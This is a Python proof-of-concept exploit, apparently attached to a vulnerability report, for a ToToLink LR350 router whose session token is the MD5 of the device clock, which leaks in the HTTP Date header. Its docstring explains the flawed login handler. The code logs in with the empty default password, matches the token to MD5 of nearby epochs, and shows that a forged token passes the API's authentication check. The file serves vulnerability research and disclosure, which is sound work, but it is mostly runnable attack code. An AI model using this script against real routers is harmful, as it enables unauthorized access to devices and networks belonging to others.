#!/usr/bin/env python3
"""
PoC — ToToLink LR350 (fw V9.3.5u.6698) session token = MD5(time(NULL)).
Report finding: To1 (HIGH). Dynamically VERIFIED 2026-07-07 via Firmwell rehosting.

Root cause (loginAuth handler sub_4281E4 in /www/cgi-bin/cstecgi.cgi):
    v16 = time(0);
    sprintf(v24, "echo -n \\\"%ld\\\" | md5sum | awk '{ print $1 }'", v16);  // token = MD5(epoch)
    getCmdResult(v24, v35, 128);
    f_write_excl("/tmp/cookie_key", v35, ...);          // server-side session token
    // response JSON: {"token": <md5>, "jump_page": "home.html?token=<md5>"}

The session token is the MD5 of the device's UNIX epoch. The epoch is leaked in every HTTP `Date:`
header, so an attacker computes any active session's token offline.

NOTE: `readelf` shows no MD5 import because the hash is computed via a shell `echo | md5sum` command,
not a linked library.

Threat model: network-only, zero credentials. The PoC predicts the token from the Date header, logs in
to mint/confirm it, then proves the forged token passes the auth gate a bogus token cannot.

Usage ( Firmwell rehost — real fs, full bypass demonstrated ):
    python3 poc_totolink_lr350_md5time_token.py --target http://192.168.1.1   # inside the Firmwell container
Caveat: under the plain greenhouse qemu-user harness the differential can FAIL because
`f_write_excl("/tmp/cookie_key", O_EXCL)` does not land on disk there, so `?token=` has no session to
match — use Firmwell rehosting or real hardware for the end-to-end bypass.
Non-destructive: one reset POST + one loginAuth POST + two getLanCfg POSTs; changes no device config.
"""
import argparse, hashlib, re, sys
from email.utils import parsedate_to_datetime
import requests

def epoch_of(date_hdr):
    return int(parsedate_to_datetime(date_hdr).timestamp())

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://172.17.0.5",
                    help="base URL of the ToToLink LR350 web UI (emulator bridge IP)")
    ap.add_argument("--timeout", type=int, default=6)
    a = ap.parse_args()
    base = a.target.rstrip("/")

    api = base + "/cgi-bin/cstecgi.cgi"

    # 0) Reset the server-side session file. loginAuth's success path writes /tmp/cookie_key with
    #    f_write_excl (O_EXCL), which silently no-ops if the file already exists — so on a warm device
    #    the freshly issued token never overwrites the stale key and the new token is rejected. A
    #    prior FAILED login runs `rm -f /tmp/cookie_key`, letting the next successful login write it
    #    fresh. (This mirrors the real attack: the victim's session is the fresh one.)
    requests.post(api, json={"topicurl": "loginAuth", "username": "admin",
                             "password": "x", "flag": "0"}, timeout=a.timeout)

    # 1) Real zero-credential login (default password is empty). The CGI leaks stderr noise
    #    ("SendMsgToApply... Lktos Command Execution Failed") into the body before the JSON, so parse
    #    the token with a regex rather than r.json().
    r = requests.post(api, json={"topicurl": "loginAuth", "username": "admin",
                                 "password": "", "flag": "0"}, timeout=a.timeout)
    date_hdr = r.headers.get("Date")          # same second the CGI called time(0)
    m = re.search(r'"token"\s*:\s*"([0-9a-fA-F]+)"', r.text)
    token = m.group(1) if m else None
    if not (date_hdr and token):
        print("[-] Could not obtain Date header / token from login response.")
        print("    body[:200]:", r.text[:200].replace("\n", " "))
        sys.exit(2)
    print(f"[*] Login Date header  : {date_hdr}")
    print(f"[*] Server-issued token: {token}")

    # 2) token == MD5(time(NULL)); the Date header gives the seed second. Brute-force +/-4s for jitter
    #    between the CGI's time(0) and lighttpd's Date stamp.
    epoch = epoch_of(date_hdr)
    print(f"[*] Server UNIX epoch  : {epoch}  (testing +/-4s window)")
    matched_at = next(((epoch + d, d) for d in range(-4, 5)
                       if hashlib.md5(str(epoch + d).encode()).hexdigest().lower() == token.lower()),
                      None)
    if not matched_at:
        print(f"[-] token != MD5(time) within +/-4s of epoch {epoch}. Not verified.")
        sys.exit(1)
    seed, d = matched_at
    print(f"[+] Forgeability: token == MD5(time(NULL))  [seed = {seed} ({d:+d}s jitter)]")

    # 3) Differential — the auth-bypass proof. Same protected API, two packets:
    #    control (bogus token) -> "token invalid"; exploit (forged MD5(time)) -> auth gate passed.
    ctrl_r = requests.post(api + "?token=00000000000000000000000000000000",
                           json={"topicurl": "getLanCfg"}, timeout=a.timeout)
    expl_r = requests.post(api + "?token=" + token,
                           json={"topicurl": "getLanCfg"}, timeout=a.timeout)
    ctrl_rejected = "token invalid" in ctrl_r.text
    expl_accepted = "token invalid" not in expl_r.text

    def show(label, r):
        body = " ".join(r.text.split())   # collapse whitespace/newlines for one-line display
        more = "…" if len(r.text) > 300 else ""
        print(f"[{label}] HTTP {r.status_code}  ({len(r.text)} bytes)")
        print(f"    body: {body[:300]}{more}")
    print()
    show("CONTROL  bogus token  ", ctrl_r)
    show("EXPLOIT  forged token ", expl_r)
    print()
    print(f"[*] control rejected at auth gate : {'YES (token invalid)' if ctrl_rejected else 'NO'}")
    print(f"[*] exploit passed the auth gate  : {'YES' if expl_accepted else 'NO (token invalid)'}")
    print()
    if ctrl_rejected and expl_accepted:
        print("[+] VERIFIED: forged MD5(time) token passes the auth gate that a bogus token cannot.")
        print("    An unauthenticated attacker who reads the HTTP Date header forges a valid session token.")
        sys.exit(0)
    print("[-] Differential FAILED: forged token did not pass the auth gate.")
    print("    Forgeability is proven, but the auth-gate bypass was not demonstrated in this environment.")
    print("    (Under plain qemu-user, /tmp/cookie_key may not persist via f_write_excl/O_EXCL; rehost with")
    print("    Firmwell (real fs) or test on hardware.)")
    sys.exit(1)

if __name__ == "__main__":
    main()
